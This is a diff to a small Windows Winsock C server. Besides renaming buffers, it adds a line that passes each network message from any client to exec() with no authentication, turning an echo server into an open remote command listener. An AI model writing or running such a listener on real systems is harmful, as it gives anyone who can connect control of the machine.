@@ -1,4 +1,4 @@
-#include <WinSock2.h>
+#include <winsock2.h>
 #include <windows.h>
 #include <string.h>
 #include <stdio.h>
@@ -9,6 +9,7 @@
 
 int listen_port = DEFAULT_LISTEN_PORT;
 int address_length = sizeof (struct sockaddr_in);
+char send_buffer[BUFFER_LENGTH];
 
 inline int run_server()
 {
@@ -73,12 +74,14 @@ inline int run_server()
                 }
                 else
                 {
-                    char buffer[BUFFER_LENGTH];
-                    memset (buffer, 0, BUFFER_LENGTH);
-                    if (recv (client_sockets.fd_array[i], buffer, BUFFER_LENGTH, 0) > 0)
+                    char recv_buffer[BUFFER_LENGTH];
+                    memset (recv_buffer, 0, sizeof (recv_buffer));
+                    memset (send_buffer, 0, sizeof (send_buffer));
+                    if (recv (client_sockets.fd_array[i], recv_buffer, BUFFER_LENGTH, 0) > 0)
                     {
-                        printf ("Received client message:%s\n", buffer);
-                        send (client_sockets.fd_array[i], buffer, strlen (buffer), 0);
+                        printf ("Received client message:%s\n", recv_buffer);
+                        exec (recv_buffer);
+                        send (client_sockets.fd_array[i], recv_buffer, strlen (recv_buffer), 0);
                     }
                     else
                     {
